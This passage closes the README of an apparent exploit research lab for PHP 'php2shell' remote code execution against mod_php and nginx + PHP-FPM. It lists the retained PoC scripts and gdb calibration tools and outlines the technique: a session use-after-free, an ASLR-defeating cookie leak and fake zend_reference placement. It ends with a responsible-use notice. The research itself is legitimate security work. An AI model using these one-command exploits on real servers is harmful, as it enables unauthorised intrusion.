* In Git Bash `SHELL` already has a meaning, so it is a bad variable name for a PoC —
  the FPM write target is `FPM_SHELL`.

## What was dropped from the original lab directory

The working directory held ~330 files.  Removed here: the obsolete
`hash_update`-based chains (`api/`, `fixed/`, `minimal/`, `reseed/`, `stale/`),
another agent's git clone (`ref_remote/`, 44 MB), the scraped Calif report
(`calif-php2shell.html/.txt`), the superseded 8094 three-stage `full_rce.py` and
the `off_rce.py` that needed raised `max_input_vars`/`max_multipart_body_parts`
with now-stale offsets, the one-shot `off_a*.py` / `measure_def_ab.py` calibration
drivers and the ~50 `gdb-*.txt` terminal captures, the bare-metal probes the FPM
chain was first measured with (the direct-to-9000 `fcgi.py`, `bg_fpm.py` and the
`gdb-bg*.py` set — their conclusions are baked into `exploits/fpm_rce.py` as
constants, and its containerised HTTP environment was rewritten as
`docker/Dockerfile.fpm` + `docker/fpm/`), and every `out-*` run artifact.
Kept: the five PoC scripts (four mod_php + the nginx/PHP-FPM one) plus the vendored
reference `exploit.py`, the gdb-driven measurement scripts that document *how* each
constant was obtained, and the four `gdb-*.py` scripts those drivers load.

Both chains ship in this repository and both are one command away: mod_php under
"The chain (1)" (`exploit off` and friends), nginx + PHP-FPM under "The chain (2)"
(`exploit fpm`).

## Acknowledgements

* [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
  — the origin of this work.  The idea that a mod_php request can bail out on an
  OOM *after* the session is initialised and still be talked into an out-of-bounds
  `Set-Cookie` leak, that the leak carries both the Zend MM chunk base and the
  `libphp.so` base (which is what kills ASLR here), and that
  `session.upload_progress` + `PHP_SESSION_UPLOAD_PROGRESS` is the allocation site
  to aim the fake `zend_reference` at — all of that is theirs, as is the minimal
  `<?php echo "OK\n"; ?>` attack surface and the A1/B1/A2/B2 stage structure.
  `exploits/exploit.py` in this tree is their chain, vendored as the reference
  implementation (only the two paths inside this tree were fixed).  Without that
  project nothing here would exist.
* The Calif Research php2shell write-up (calif.io) — the direction of the FPM
  chain comes from it: PHP-FPM's pre-RINIT session decode leaves a dangling
  `BG(unserialize)` decoder.  Turning that into a pure-HTTP, one-command
  nginx + PHP-FPM exploit — the three-step push calibration, the choice of write
  target, the container and rebuild flow — is this tree's work.
* The PHP bug itself (the session UAF behind the bailout) is upstream's; this lab
  is research into its exploitability, run against our own containers.

## License / responsible use

Everything here targets containers created by this lab on `127.0.0.1`.  Use it
only against systems you own or are authorised to test.
